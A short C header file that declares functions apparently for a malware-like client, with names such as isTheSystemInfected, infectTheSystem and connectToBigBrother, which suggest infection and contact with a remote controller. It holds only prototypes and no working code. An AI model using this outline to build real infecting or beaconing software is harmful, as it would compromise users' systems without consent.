#ifndef CLIENT_HELPER_H
#define CLIENT_HELPER_H

#include <stdbool.h>
#include <wchar.h>

bool isThePlaceToBe(const char *pathOfProgram);

bool isTheSystemInfected(void);

const wchar_t *infectTheSystem(void);

void startProgram(const wchar_t *pathOfProgram);

void connectToBigBrother(void);

#endif /* CLIENT_HELPER_H */
